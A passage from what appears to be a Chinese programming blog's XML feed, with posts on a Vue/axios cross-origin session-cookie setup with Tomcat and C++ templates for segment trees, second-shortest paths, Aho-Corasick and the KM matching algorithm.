<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">axios.delete(<span class="string">"/admin/comment/delete"</span>, &#123;</span><br><span class="line">    data: &#123;</span><br><span class="line">      id: <span class="built_in">JSON</span>.stringify(cmtId)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">).then(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">&#125;).catch(<span class="function"><span class="params">e</span> =&gt;</span> &#123;&#125;);</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>博客</category>
      </categories>
      <tags>
        <tag>Vue</tag>
        <tag>框架</tag>
        <tag>UI</tag>
      </tags>
  </entry>
  <entry>
    <title>线段树模板</title>
    <url>/2021/02/01/%E7%BA%BF%E6%AE%B5%E6%A0%91%E6%A8%A1%E6%9D%BF/</url>
    <content><![CDATA[<!--只是一个模板-->

<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> MAX_N = <span class="number">1e5</span> + <span class="number">1</span>;</span><br><span class="line"><span class="comment">// const int MAX_N = 1e2 + 1;</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> LL;</span><br><span class="line">LL num[MAX_N], tree[MAX_N &lt;&lt; <span class="number">2</span>], tag[MAX_N &lt;&lt; <span class="number">2</span>];</span><br><span class="line"><span class="comment">// 对 [l,r] 区间建立线段树,当前根的编号为 nowIndex</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">build</span><span class="params">(<span class="keyword">int</span> l, <span class="keyword">int</span> r, <span class="keyword">int</span> nowIndex)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (l == r)&#123;</span><br><span class="line">        tree[nowIndex] = num[l];</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> mid = l + r &gt;&gt; <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// 后序遍历的方式进行建树</span></span><br><span class="line">    build(l, mid, nowIndex &lt;&lt; <span class="number">1</span>), build(mid + <span class="number">1</span>, r, nowIndex &lt;&lt; <span class="number">1</span> | <span class="number">1</span>);</span><br><span class="line">    tree[nowIndex] = tree[nowIndex &lt;&lt; <span class="number">1</span>] + tree[nowIndex &lt;&lt; <span class="number">1</span> | <span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//更新[l,r]区间（每个元素加上k），编号为 nowIndex 的节点记录[L, R]的区间和</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">update</span><span class="params">(<span class="keyword">int</span> l, <span class="keyword">int</span> r, <span class="keyword">int</span> L, <span class="keyword">int</span> R, <span class="keyword">int</span> nowIndex, LL k)</span></span>&#123;</span><br><span class="line">    <span class="comment">// 如果当前区间是待修改区间的子集的时候，打上标记、更改节点值后直接返回</span></span><br><span class="line">    <span class="keyword">if</span> (l &lt;= L &amp;&amp; R &lt;= r)&#123;</span><br><span class="line">        tree[nowIndex] += (R - L + <span class="number">1</span>) * k, tag[nowIndex] += k;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> mid = L + R &gt;&gt; <span class="number">1</span>, leftNode = nowIndex &lt;&lt; <span class="number">1</span>, rightNode = nowIndex &lt;&lt; <span class="number">1</span> | <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// 当前节点不是叶子结点、标记不为空的时候</span></span><br><span class="line">    <span class="keyword">if</span> (tag[nowIndex] &amp;&amp; L != R)&#123;</span><br><span class="line">        <span class="comment">// 将标记下传并且更新左右节点</span></span><br><span class="line">        tree[leftNode]  += tag[nowIndex] * (mid - L + <span class="number">1</span>), tree[rightNode] += tag[nowIndex] * (R - mid);</span><br><span class="line">        tag[leftNode] += tag[nowIndex], tag[rightNode] += tag[nowIndex];</span><br><span class="line">        <span class="comment">// 清空当前节点的标记</span></span><br><span class="line">        tag[nowIndex] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//如果左儿子代表的区间 [L,mid] 与修改区间有交集,则递归更新左儿子</span></span><br><span class="line">    <span class="keyword">if</span> (l &lt;= mid)update(l, r, L, mid, leftNode, k);</span><br><span class="line">    <span class="comment">//如果右儿子代表的区间 [mid + 1,R] 与修改区间有交集,则递归更新左儿子</span></span><br><span class="line">    <span class="keyword">if</span> (r &gt;= mid + <span class="number">1</span>)update(l, r, mid + <span class="number">1</span>, R, rightNode, k);</span><br><span class="line">    tree[nowIndex] = tree[leftNode] + tree[rightNode];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//查询[l,r]区间，编号为 nowIndex 的节点记录[L, R]的区间和</span></span><br><span class="line"><span class="function">LL <span class="title">getSum</span><span class="params">(<span class="keyword">int</span> l, <span class="keyword">int</span> r, <span class="keyword">int</span> L, <span class="keyword">int</span> R, <span class="keyword">int</span> nowIndex)</span></span>&#123;</span><br><span class="line">    <span class="comment">// 如果当前区间是待查询区间的子集的时候，直接返回</span></span><br><span class="line">    <span class="keyword">if</span> (l &lt;= L &amp;&amp; R &lt;= r)<span class="keyword">return</span> tree[nowIndex];</span><br><span class="line">    <span class="keyword">int</span> mid = L + R &gt;&gt; <span class="number">1</span>, leftNode = nowIndex &lt;&lt; <span class="number">1</span>, rightNode = nowIndex &lt;&lt; <span class="number">1</span> | <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (tag[nowIndex] &amp;&amp; L != R)&#123;</span><br><span class="line">        <span class="comment">// 将标记下传并且更新左右节点</span></span><br><span class="line">        tree[leftNode]  += tag[nowIndex] * (mid - L + <span class="number">1</span>), tree[rightNode] += tag[nowIndex] * (R - mid);</span><br><span class="line">        tag[leftNode] += tag[nowIndex], tag[rightNode] += tag[nowIndex];</span><br><span class="line">        <span class="comment">// 清空当前节点的标记</span></span><br><span class="line">        tag[nowIndex] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    LL sum = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//如果左儿子代表的区间 [L,mid] 与查询区间有交集,则递归查询左儿子</span></span><br><span class="line">    <span class="keyword">if</span> (l &lt;= mid)sum = getSum(l, r, L, mid, leftNode);</span><br><span class="line">    <span class="comment">//如果右儿子代表的区间 [mid + 1,R] 与查询区间有交集,则递归查询左儿子</span></span><br><span class="line">    <span class="keyword">if</span> (r &gt;= mid + <span class="number">1</span>)sum += getSum(l, r, mid + <span class="number">1</span>, R, rightNode);</span><br><span class="line">    <span class="keyword">return</span> sum;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>递归</tag>
        <tag>位操作</tag>
        <tag>与运算</tag>
      </tags>
  </entry>
  <entry>
    <title>使用axios+tomcat HttpServlet处理跨域请求以及处理cookie</title>
    <url>/2020/12/17/%E4%BD%BF%E7%94%A8axios-tomcat-HttpServlet%E5%A4%84%E7%90%86%E8%B7%A8%E5%9F%9F%E8%AF%B7%E6%B1%82%E4%BB%A5%E5%8F%8A%E5%A4%84%E7%90%86cookie/</url>
    <content><![CDATA[<h2 id="前因"><a href="#前因" class="headerlink" title="前因"></a>前因</h2><p>有一个需求，前端通过<code>axios</code>发送用户名和密码到后台，后台查询数据库后，确认合法用户后直接把信息存进<code>session</code>里边，而为了实现这个 需求，就需要前端解决跨域，并且将cookie存到本地计算机中。<a id="more"></a></p>
<h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><p>首先是通过代理实现跨域请求：前端发送<code>url:http://localhost:8081/beforeLogin</code>，访问到<code>http://localhost:8080/testJson4servlet/beforeLogin</code></p>
<p>参照广大网友的步骤：在和<code>package.json</code>同级目录下新建配置文件<code>vue.config.js</code></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// vue.config.js</span></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line"></span><br><span class="line">    devServer: &#123;</span><br><span class="line">        port: <span class="number">8081</span>,</span><br><span class="line">        proxy: &#123;</span><br><span class="line">            <span class="string">'/api'</span>: &#123;</span><br><span class="line"></span><br><span class="line">                target: <span class="string">'http://localhost:8080/testJson4servlet/'</span>,</span><br><span class="line">                ws: <span class="literal">false</span>,</span><br><span class="line">                changeOrigin: <span class="literal">true</span>,</span><br><span class="line">                pathRewrite: &#123;</span><br><span class="line">                    <span class="string">'^/api'</span>: <span class="string">''</span>,</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        disableHostCheck: <span class="literal">true</span>,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在<code>main.js</code>中配置全局<code>axios</code></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> Axios <span class="keyword">from</span> <span class="string">'axios'</span></span><br><span class="line">Vue.use(ElementUI);</span><br><span class="line"></span><br><span class="line">Vue.prototype.$axios = Axios;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Vue.config.productionTip = <span class="literal">false</span></span><br><span class="line">Axios.defaults.withCredentials = <span class="literal">true</span>;</span><br></pre></td></tr></table></figure>

<p>在需要发送请求的地方加上前缀url：”api”</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">this</span>.$axios.get(<span class="string">"/api/beforeLogin"</span>).then(<span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">	<span class="built_in">console</span>.log(res);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<hr>
<p>这样子虽然能够发送请求，后台也能够接受数据，但是！！！，每次发送的sessionID都不一样，这样子无法进行登陆验证（你会发现每次登陆后，下次还要登陆），在浏览器里边打开审查元素也看不到Cookie，但是在响应头Response headers里边看到了set-cookie：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set-cookie: JSESSIONID&#x3D;DFBEA9837130E7DA23723674A2B3EFE9; Path&#x3D;&#x2F;testJson4servlet; HttpOnly</span><br></pre></td></tr></table></figure>

<p>注意到后面的这个<code>testJson4servlet</code>，这个地址刚好是我后台<code>tomcat</code>的项目地址。</p>
<p>由于我们前面使用代理的时候设置了rul前缀为api，导致这里对应不上，因此需要在<code>vue.config.js</code>改我们的前缀<code>url</code>为我们的项目地址</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// vue.config.js</span></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line"></span><br><span class="line">    devServer: &#123;</span><br><span class="line">        port: <span class="number">8081</span>,</span><br><span class="line">        proxy: &#123;</span><br><span class="line">            <span class="string">'/testJson4servlet'</span>: &#123;</span><br><span class="line"></span><br><span class="line">                target: <span class="string">'http://localhost:8080/testJson4servlet/'</span>,</span><br><span class="line">                ws: <span class="literal">false</span>,</span><br><span class="line">                changeOrigin: <span class="literal">true</span>,</span><br><span class="line">                pathRewrite: &#123;</span><br><span class="line">                    <span class="string">'^/testJson4servlet'</span>: <span class="string">''</span>,</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        disableHostCheck: <span class="literal">true</span>,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>请求代码相应地进行修改</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">this</span>.$axios.get(<span class="string">"/api/beforeLogin"</span>).then(<span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">	<span class="built_in">console</span>.log(res);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>后台打印的sessionId终于短时间内不会改变了！！！:D</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">org.apache.catalina.session.StandardSessionFacade@<span class="number">7</span>fa755a9</span><br><span class="line">org.apache.catalina.session.StandardSessionFacade@<span class="number">7</span>fa755a9</span><br><span class="line">org.apache.catalina.session.StandardSessionFacade@<span class="number">7</span>fa755a9</span><br><span class="line">org.apache.catalina.session.StandardSessionFacade@<span class="number">7</span>fa755a9</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Vue初级</category>
      </categories>
      <tags>
        <tag>Cookie</tag>
        <tag>Vue</tag>
        <tag>axios</tag>
      </tags>
  </entry>
  <entry>
    <title>Dijkstra算法实现次短路</title>
    <url>/2020/12/06/Dijkstra%E7%AE%97%E6%B3%95%E5%AE%9E%E7%8E%B0%E6%AC%A1%E7%9F%AD%E8%B7%AF/</url>
    <content><![CDATA[<p>Dijkstra可以用于求解最短路问题，实际上该算法也可以实现次短路，更一般的，该算法可以实现第k短路</p>
<h2 id="模版"><a href="#模版" class="headerlink" title="模版"></a>模版</h2><p>题目：<a href="http://poj.org/problem?id=3255" target="_blank" rel="noopener">POJ-3255</a></p>
<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><a id="more"></a>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> MAX_N = <span class="number">5001</span>, INF = <span class="number">0x7fffffff</span>;</span><br><span class="line"><span class="comment">// 分别存放0号节点到该节点的最短距离、次短距离</span></span><br><span class="line"><span class="keyword">int</span> dist1[MAX_N], dist2[MAX_N];</span><br><span class="line"><span class="keyword">int</span> n, r;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Edge</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> adj, cost;</span><br><span class="line">    Edge(<span class="keyword">int</span> adj, <span class="keyword">int</span> cost) &#123;<span class="keyword">this</span>-&gt;adj = adj, <span class="keyword">this</span> -&gt; cost = cost;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 第一个代表距离、第二个代表后继节点</span></span><br><span class="line"><span class="keyword">typedef</span> pair&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt; P;</span><br><span class="line"><span class="built_in">vector</span>&lt;Edge&gt; nodeEdges[MAX_N];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">addEdge</span><span class="params">(<span class="keyword">int</span> u, <span class="keyword">int</span> v, <span class="keyword">int</span> cost)</span> </span>&#123;</span><br><span class="line">    nodeEdges[u].push_back(Edge(v, cost));</span><br><span class="line">    nodeEdges[v].push_back(Edge(u, cost));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Dijkstra 思想</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    <span class="comment">// 距离小的P优先级高</span></span><br><span class="line">    priority_queue&lt;P, <span class="built_in">vector</span>&lt;P&gt;, greater&lt;P&gt; &gt; myQueue; </span><br><span class="line">    <span class="built_in">fill</span>(dist1, dist1 + n, INF);</span><br><span class="line">    <span class="built_in">fill</span>(dist2, dist2 + n, INF);</span><br><span class="line">    dist1[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    myQueue.push(P(<span class="number">0</span>, <span class="number">0</span>));</span><br><span class="line">    <span class="keyword">while</span> (!myQueue.empty()) &#123;</span><br><span class="line">        P top = myQueue.top();</span><br><span class="line">        myQueue.pop();</span><br><span class="line">        <span class="keyword">int</span> adjNode = top.second, dist = top.first;</span><br><span class="line">        <span class="keyword">if</span> (dist2[adjNode] &lt; dist)<span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; nodeEdges[adjNode].<span class="built_in">size</span>();i++) &#123;</span><br><span class="line">            Edge edge = nodeEdges[adjNode][i];</span><br><span class="line">            <span class="keyword">int</span> toNodeDist = dist + edge.cost;</span><br><span class="line">            <span class="comment">// 更新最短距离</span></span><br><span class="line">            <span class="keyword">if</span> (toNodeDist &lt; dist1[edge.adj]) &#123;</span><br><span class="line">                swap(dist1[edge.adj], toNodeDist);</span><br><span class="line">                myQueue.push(P(dist1[edge.adj], edge.adj));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 更新次短距离</span></span><br><span class="line">            <span class="keyword">if</span> (dist2[edge.adj] &gt; toNodeDist &amp;&amp; dist1[edge.adj] &lt; toNodeDist) &#123;</span><br><span class="line">                dist2[edge.adj] = toNodeDist;</span><br><span class="line">                myQueue.push(P(dist2[edge.adj], edge.adj));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,dist2[n - <span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> u, v, w;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>, &amp;n, &amp;r);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; r; i++) &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d%d%d"</span>, &amp;u, &amp;v, &amp;w);</span><br><span class="line">        addEdge(u - <span class="number">1</span>, v - <span class="number">1</span>, w);</span><br><span class="line">    &#125;</span><br><span class="line">    solve();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>最短路</tag>
      </tags>
  </entry>
  <entry>
    <title>AC自动机算法</title>
    <url>/2020/11/27/AC%E8%87%AA%E5%8A%A8%E6%9C%BA%E7%AE%97%E6%B3%95/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><code>AC</code>自动机，英文是<code>Aho-Corasick automaton</code>，该算法在1975年产生于贝尔实验室，是著名的多模匹配算法。</p>
<p>该算法借助<code>Trie</code>，即字典树，配以失配指针，在多模式串匹配中有着极高的效率。</p>
<p>算法的第一步是根据所有的模式串构建一颗字典树，然后就是添加失配指针，最后是模式匹配过程。</p>
<p>在只有一个模式串的时候，一般采用<code>KMP</code>算法，该算法核心在于<code>next[]</code>数组，该数组作用是当遇到当前字符不匹配的时候，模式串该如何移动。面对很多模式串的时候，如果对每一个模式串都采用<code>KMP</code>算法，这样虽然理论上可行，但是时间复杂度非常之高。</p>
<p><code>AC</code>自动机中的<code>Fail</code>指针的作用也是类似<code>next[]</code>，不过这个失配指针的构建是根据模式串之间的公共后缀进行构建的。<a id="more"></a></p>
<h2 id="算法实现"><a href="#算法实现" class="headerlink" title="算法实现"></a>算法实现</h2><h3 id="题目背景"><a href="#题目背景" class="headerlink" title="题目背景"></a>题目背景</h3><p><a href="https://www.luogu.com.cn/problem/P3808" target="_blank" rel="noopener">洛谷P3808 AC自动机模版</a></p>
<h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DESC (1000001)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TABLE_LEN (26)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KW_LEN (51)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NODE_LEN (1000006)</span></span><br><span class="line"><span class="comment">// #define NODE_LEN (16)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ROOT (0)</span></span><br><span class="line"><span class="keyword">char</span> dscri[NODE_LEN];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> child[TABLE_LEN];</span><br><span class="line">    <span class="keyword">int</span> fail;</span><br><span class="line">    <span class="keyword">char</span> name;</span><br><span class="line">    <span class="keyword">int</span> cnt;</span><br><span class="line">&#125; AC[NODE_LEN];</span><br><span class="line"><span class="keyword">int</span> nodePtr = <span class="number">1</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">addFail</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">queue</span>&lt;<span class="keyword">int</span>&gt; myQueue;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; TABLE_LEN; i++)</span><br><span class="line">        <span class="keyword">if</span> (AC[ROOT].child[i]) myQueue.push(AC[ROOT].child[i]);</span><br><span class="line">    <span class="keyword">while</span> (!myQueue.empty()) &#123;</span><br><span class="line">        <span class="keyword">int</span> father = myQueue.front();</span><br><span class="line">        myQueue.pop();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; TABLE_LEN; i++) &#123;</span><br><span class="line">            <span class="keyword">int</span> childId = AC[father].child[i];</span><br><span class="line">            <span class="keyword">if</span> (childId) &#123;</span><br><span class="line">                <span class="comment">// 若AC[father].fail节点没有子节点i  则AC[childId].fail为0</span></span><br><span class="line">                <span class="comment">// 即根节点</span></span><br><span class="line">                AC[childId].fail = AC[AC[father].fail].child[i];</span><br><span class="line">                myQueue.push(childId);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                AC[father].child[i] = AC[AC[father].fail].child[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">trieInsert</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *<span class="keyword">word</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> now = ROOT, len = <span class="built_in">strlen</span>(<span class="keyword">word</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        <span class="keyword">int</span> c = <span class="keyword">word</span>[i] - <span class="string">'a'</span>;</span><br><span class="line">        <span class="keyword">if</span> (!AC[now].child[c]) &#123;</span><br><span class="line">            AC[now].child[c] = nodePtr++;</span><br><span class="line">            AC[AC[now].child[c]].name = c + <span class="string">'a'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        now = AC[now].child[c];</span><br><span class="line">    &#125;</span><br><span class="line">    AC[now].cnt++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">acQuery</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> len = <span class="built_in">strlen</span>(dscri), sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> now = ROOT;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        <span class="keyword">int</span> c = dscri[i] - <span class="string">'a'</span>;</span><br><span class="line">        now = AC[now].child[c];</span><br><span class="line">        <span class="comment">// 循环求解是因为fail指向的节点也和该节点有相同部分</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = now; j &amp;&amp; AC[j].cnt != <span class="number">-1</span>; j = AC[j].fail) &#123;</span><br><span class="line">            sum += AC[j].cnt;</span><br><span class="line">            AC[j].cnt = <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> caseNum, n;</span><br><span class="line">    <span class="keyword">char</span> p[NODE_LEN];</span><br><span class="line">    <span class="built_in">memset</span>(AC, <span class="number">0</span>, <span class="keyword">sizeof</span>(AC));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%s"</span>, p);</span><br><span class="line">        trieInsert(p);</span><br><span class="line">    &#125;</span><br><span class="line">    addFail();</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>, dscri);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, acQuery());</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>c</tag>
        <tag>BFS</tag>
        <tag>AC自动机</tag>
      </tags>
  </entry>
  <entry>
    <title>利用KM算法求解最大权匹配</title>
    <url>/2020/11/27/%E5%88%A9%E7%94%A8KM%E7%AE%97%E6%B3%95%E6%B1%82%E8%A7%A3%E6%9C%80%E5%A4%A7%E6%9D%83%E5%8C%B9%E9%85%8D/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><code>KM</code>算法是一种计算机算法，功能是求完备匹配下的最大权<a href="https://baike.baidu.com/item/匹配/6397551" target="_blank" rel="noopener">匹配</a>。在一个二分图内，左顶点为<code>X</code>，右顶点为<code>Y</code>，现对于每组左右连接<code>Xi-&gt;Yj</code>有权<code>wij</code>，求一种匹配使得所有<code>wij</code>的和最大<a id="more"></a></p>
<p>参考博客：<a href="https://www.cnblogs.com/logosG/p/logos.html" target="_blank" rel="noopener">KM算法入门</a></p>
<h2 id="算法实现"><a href="#算法实现" class="headerlink" title="算法实现"></a>算法实现</h2><h3 id="题目背景"><a href="#题目背景" class="headerlink" title="题目背景"></a>题目背景</h3><p><a href="http://acm.hdu.edu.cn/showproblem.php?pid=2255" target="_blank" rel="noopener">奔小康挣大钱</a></p>
<h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> MAXN = <span class="number">305</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> INF = <span class="number">0x3f3f3f3f</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> love[MAXN][MAXN];</span><br><span class="line"><span class="keyword">int</span> ex_user[MAXN];</span><br><span class="line"><span class="keyword">int</span> ex_house[MAXN];</span><br><span class="line"><span class="keyword">bool</span> vis_user[MAXN];</span><br><span class="line"><span class="keyword">bool</span> vis_house[MAXN];</span><br><span class="line"><span class="keyword">int</span> match[MAXN];</span><br><span class="line"><span class="keyword">int</span> slack[MAXN];</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> N;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> user)</span> </span>&#123;</span><br><span class="line">    vis_user[user] = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> house = <span class="number">0</span>; house &lt; N; ++house) &#123;</span><br><span class="line">        <span class="keyword">if</span> (vis_house[house]) <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">int</span> gap = ex_user[user] + ex_house[house] - love[user][house];</span><br><span class="line">        <span class="keyword">if</span> (gap == <span class="number">0</span>) &#123;</span><br><span class="line">            vis_house[house] = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">if</span> (match[house] == <span class="number">-1</span> || dfs(match[house])) &#123;</span><br><span class="line">                match[house] = user;</span><br><span class="line">                <span 